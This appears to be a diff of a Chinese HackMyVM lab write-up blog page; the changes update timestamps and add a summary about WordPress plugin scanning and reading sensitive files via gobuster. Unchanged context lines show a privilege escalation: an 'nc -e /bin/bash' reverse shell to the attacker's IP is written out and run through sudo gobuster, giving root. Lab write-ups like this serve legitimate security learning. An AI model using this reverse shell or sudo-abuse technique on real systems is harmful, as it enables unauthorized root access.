@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://pic1.imgdb.cn/item/67a342afd0e0a243d4fbf73c.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/67a342b0d0e0a243d4fbf73d.png">
 <meta property="article:published_time" content="2025-02-05T06:36:29.000Z">
-<meta property="article:modified_time" content="2025-02-05T13:15:22.528Z">
+<meta property="article:modified_time" content="2025-02-05T13:19:17.243Z">
 <meta property="article:author" content="guayu-kakeru">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="HMV">
@@ -224,7 +224,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2025-02-05 14:36:29 / 修改时间：21:15:22" itemprop="dateCreated datePublished" datetime="2025-02-05T14:36:29+08:00">2025-02-05</time>
+              <time title="创建时间：2025-02-05 14:36:29 / 修改时间：21:19:17" itemprop="dateCreated datePublished" datetime="2025-02-05T14:36:29+08:00">2025-02-05</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -296,6 +296,9 @@
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─<span class="comment"># touch b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;nc -e /bin/bash 192.168.240.83 1234 &quot;</span> &gt; b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod <span class="number">777</span> b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;tmp/b&quot;</span> &gt; b.txt</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>sudo gobuster -u <span class="number">192.168</span>.<span class="number">240.83</span> -w b.txt -q -n -o ┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="symbol">bash:</span> syntax error near unexpected token `(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">2025/02/05 05:42:21 [!] unable to connect to http://192.168.240.83/: Get http://192.168.240.83/: dial tcp 192.168.240.83:80: connect: connection refused</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br></pre></td></tr></table></figure></div>
 <p>用我这种方式扫目录，要在本机主目录下开http，不然没有tmp目录</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# nc -lp 1234              </span><br><span class="line">id</span><br><span class="line">  </span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure></div>
+
+<p>总结：1 wordpress的插件扫描以及常见的利用 2 gobuster或者目录扫描工具的读取敏感文件通用思路</p>
+
     </div>
 
     
